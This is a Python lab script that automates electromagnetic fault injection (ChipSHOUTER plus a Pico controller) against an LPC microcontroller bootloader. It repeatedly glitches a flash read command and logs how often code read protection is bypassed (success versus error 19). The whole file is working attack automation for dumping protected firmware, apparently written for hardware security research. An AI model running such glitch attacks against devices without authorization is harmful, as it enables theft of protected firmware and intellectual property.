#!/usr/bin/env python3
"""
Test specific glitch parameters for statistical analysis.
Run many iterations of known-working parameters to determine success rate.
"""

import serial
import time
import csv
from datetime import datetime
import sys

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200
TIMEOUT = 2.0

def send_command(ser, cmd, wait_time=0.2):
    if ser.in_waiting > 0:
        ser.read(ser.in_waiting)
    ser.write(f"{cmd}\r\n".encode())

    if cmd.startswith("CS "):
        response = ""
        max_wait = 3.0
        start_time = time.time()
        while time.time() - start_time < max_wait:
            time.sleep(0.1)
            if ser.in_waiting > 0:
                chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                response += chunk
                if "#" in chunk:
                    break
        return response
    else:
        time.sleep(wait_time)
        response = ""
        if ser.in_waiting > 0:
            response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
        return response


def wait_for_response(ser, expected_text, timeout=5.0):
    start_time = time.time()
    full_response = ""
    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if expected_text in full_response:
                return True, full_response
        time.sleep(0.01)
    return False, full_response


def setup_system(ser):
    """Initial setup."""
    print("Setting up system...", flush=True)

    # Enable API mode
    ser.write(b"API ON\r\n")
    time.sleep(0.2)
    ser.read(ser.in_waiting)

    send_command(ser, "TARGET LPC", wait_time=0.2)
    send_command(ser, "CS TRIGGER HARDWARE HIGH", wait_time=0.5)
    send_command(ser, "CS ARM", wait_time=1.0)
    print("Setup complete\n", flush=True)


def test_single_glitch(ser, voltage, pause, width):
    """Test single glitch parameters."""
    # Update ChipSHOUTER voltage
    send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5)

    # Update Pico pause (glitch delay)
    send_command(ser, f"SET PAUSE {pause}", wait_time=0.2)

    # Update Pico width (glitch duration)
    send_command(ser, f"SET WIDTH {width}", wait_time=0.2)

    # Sync with bootloader (with 2 retries)
    ser.write(b"TARGET SYNC 115200 12000 10 2\r\n")
    success, _ = wait_for_response(ser, "Synchronized", timeout=5.0)
    if not success:
        return "SYNC_FAIL"

    # Arm Pico trigger
    send_command(ser, "ARM ON", wait_time=0.2)

    # Send read command to target
    ser.write(b'TARGET SEND "R 0 516096"\r\n')

    # Wait for response with longer timeout to capture target data
    response = ""
    response_bytes = b""  # Keep raw bytes too
    start_time = time.time()
    max_wait = 3.0

    while time.time() - start_time < max_wait:
        time.sleep(0.1)
        if ser.in_waiting > 0:
            chunk_bytes = ser.read(ser.in_waiting)
            response_bytes += chunk_bytes
            chunk = chunk_bytes.decode('utf-8', errors='ignore')
            response += chunk
            # Stop if we see the prompt (response complete)
            if "> " in chunk or "ARM ON" in chunk:
                break

    # Parse using raw bytes to catch single-byte garbage
    # Look for pattern: command echo -> target data -> prompt
    # Expected: b'.R 0 516096\r\n' -> UUE/0/19/nothing -> b'+> ' or b'> '

    # Find where command echo ends (the full echo line including \r\n)
    echo_pattern = b'.R 0 516096'
    echo_end = response_bytes.find(echo_pattern)
    if echo_end >= 0:
        echo_end += len(echo_pattern)
        # Skip all trailing \r\n after the echo
        while echo_end < len(response_bytes) and response_bytes[echo_end:echo_end+1] in [b'\r', b'\n']:
            echo_end += 1

    # Find where prompt starts
    prompt_start = response_bytes.find(b'+> ', echo_end if echo_end >= 0 else 0)
    if prompt_start < 0:
        prompt_start = response_bytes.find(b'> ', echo_end if echo_end >= 0 else 0)

    # Extract data between echo and prompt
    if echo_end >= 0 and prompt_start > echo_end:
        target_data = response_bytes[echo_end:prompt_start]
        # Strip whitespace
        target_data = target_data.strip()

        if len(target_data) > 0:
            # We got data from target - check what it is
            decoded = target_data.decode('utf-8', errors='ignore').strip()

            # Check for UUE data (may be prefixed with "0\r\n")
            if 'M' in decoded[:10] or decoded.startswith('M'):
                return "SUCCESS", ""
            # Check for success code
            if decoded == '0' or decoded.startswith('0\r\n') or decoded.startswith('0\n'):
                return "SUCCESS", ""
            # Check for error 19
            if decoded == '19':
                return "ERROR19", ""
            # Anything else is garbage
            hex_dump = ' '.join(f'{b:02x}' for b in target_data[:20])
            return "GARBAGE", f"len={len(target_data)} hex={hex_dump}"

    # No data between echo and prompt = crash
    if b'+> ' in response_bytes or b'> ' in response_bytes:
        return "NO_RESPONSE", ""

    # Look for "Response (" line which indicates target responded (hex dump mode)
    if "Response (" in response:
        # Target responded - check what it sent
        if "31 39 0D 0A" in response or "| 19.." in response:
            # Hex bytes 31 39 = ASCII "19" = error code 19 (command not allowed)
            return "ERROR19", ""
        elif "30 0D 0A" in response or "30 " in response and "| 0" in response:
            # Hex byte 30 = ASCII "0" = success!
            return "SUCCESS", ""
        else:
            # Target responded but with unexpected/garbage data
            # Extract hex bytes from response
            hex_data = ""
            for line in response.split('\n'):
                if line.strip() and not line.startswith('>') and not line.startswith('OK:') and not line.startswith('TARGET'):
                    # Look for hex bytes (lines with hex patterns)
                    if any(c in line for c in '0123456789ABCDEF') and len(line) > 10:
                        hex_data += line.strip() + " "
            return "GARBAGE", hex_data.strip()
    elif "No response data" in response:
        # Firmware explicitly reports no response from target
        return "NO_RESPONSE", ""
    elif not response.strip() or response.strip() == "":
        # No response at all
        return "NO_RESPONSE", ""
    else:
        # Got some response but couldn't parse it
        return "UNKNOWN", response[:100]


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 test_success_parameters.py <iterations> [voltage]")
        print("Example: python3 test_success_parameters.py 5000 320")
        print("Default voltage: 320V")
        sys.exit(1)

    iterations = int(sys.argv[1])
    voltage = int(sys.argv[2]) if len(sys.argv) >= 3 else 320

    # Test parameters
    pause = 0
    width = 150

    print("=" * 70)
    print(f"TESTING SUCCESS PARAMETERS")
    print("=" * 70)
    print(f"Voltage: {voltage}V")
    print(f"Pause: {pause} cycles")
    print(f"Width: {width} cycles")
    print(f"Iterations: {iterations}")
    print("=" * 70)
    print()

    # Create CSV log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"success_test_{timestamp}_V{voltage}_P{pause}_W{width}_{iterations}x.csv"

    # Connect
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
    time.sleep(0.5)

    try:
        setup_system(ser)

        # Counters
        success_count = 0
        no_response_count = 0
        error19_count = 0
        garbage_count = 0
        sync_fail_count = 0
        unknown_count = 0

        start_time = time.time()
        last_print_time = start_time

        with open(csv_file, 'w', newline='', buffering=1) as f:
            writer = csv.writer(f)
            writer.writerow(['iteration', 'timestamp', 'voltage', 'pause', 'width', 'result', 'elapsed_time', 'response_data'])

            for i in range(iterations):
                test_start = time.time()
                result, extra_data = test_single_glitch(ser, voltage, pause, width)
                test_elapsed = time.time() - test_start

                # Log to CSV
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                if extra_data:
                    writer.writerow([i+1, ts, voltage, pause, width, result, f"{test_elapsed:.2f}", extra_data])
                else:
                    writer.writerow([i+1, ts, voltage, pause, width, result, f"{test_elapsed:.2f}", ""])
                f.flush()

                # Update counters
                if result == "SUCCESS":
                    success_count += 1
                    print(f"\n[{i+1}/{iterations}] ✓✓✓ SUCCESS ✓✓✓", flush=True)
                elif result == "ERROR19":
                    error19_count += 1
                elif result == "NO_RESPONSE":
                    no_response_count += 1
                elif result == "GARBAGE":
                    garbage_count += 1
                    print(f"\n[{i+1}/{iterations}] ⚠ GARBAGE: {extra_data[:80]}", flush=True)
                elif result == "SYNC_FAIL":
                    sync_fail_count += 1
                else:
                    unknown_count += 1
                    if extra_data:
                        print(f"\n[{i+1}/{iterations}] ? UNKNOWN: {extra_data[:80]}", flush=True)

                # Print progress every 30 seconds
                current_time = time.time()
                if current_time - last_print_time >= 30:
                    elapsed = current_time - start_time
                    remaining = (elapsed / (i + 1)) * (iterations - (i + 1))
                    tests_per_sec = (i + 1) / elapsed

                    print(f"\n[{i+1}/{iterations}] Progress: {(i+1)/iterations*100:.1f}%", flush=True)
                    print(f"  Success: {success_count} ({success_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Crash: {no_response_count} ({no_response_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Normal: {error19_count} ({error19_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Garbage: {garbage_count} ({garbage_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Speed: {tests_per_sec:.2f} tests/sec", flush=True)
                    print(f"  Remaining: {remaining/60:.1f} minutes\n", flush=True)

                    last_print_time = current_time

        # Final summary
        elapsed = time.time() - start_time
        print("\n" + "=" * 70)
        print("TEST COMPLETE")
        print("=" * 70)
        print(f"Duration: {elapsed/60:.1f} minutes ({elapsed/3600:.2f} hours)")
        print(f"Total tests: {iterations}")
        print(f"Tests/second: {iterations/elapsed:.2f}")
        print()
        print("Results:")
        print(f"  SUCCESS:     {success_count:5d} ({success_count/iterations*100:6.2f}%)")
        print(f"  NO_RESPONSE: {no_response_count:5d} ({no_response_count/iterations*100:6.2f}%)")
        print(f"  ERROR19:     {error19_count:5d} ({error19_count/iterations*100:6.2f}%)")
        print(f"  GARBAGE:     {garbage_count:5d} ({garbage_count/iterations*100:6.2f}%)")
        print(f"  SYNC_FAIL:   {sync_fail_count:5d} ({sync_fail_count/iterations*100:6.2f}%)")
        print(f"  UNKNOWN:     {unknown_count:5d} ({unknown_count/iterations*100:6.2f}%)")
        print()
        print(f"Results saved to: {csv_file}")
        print("=" * 70)

    finally:
        # Cleanup - disable API mode
        try:
            ser.write(b"API OFF\r\n")
            time.sleep(0.1)
        except:
            pass
        ser.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
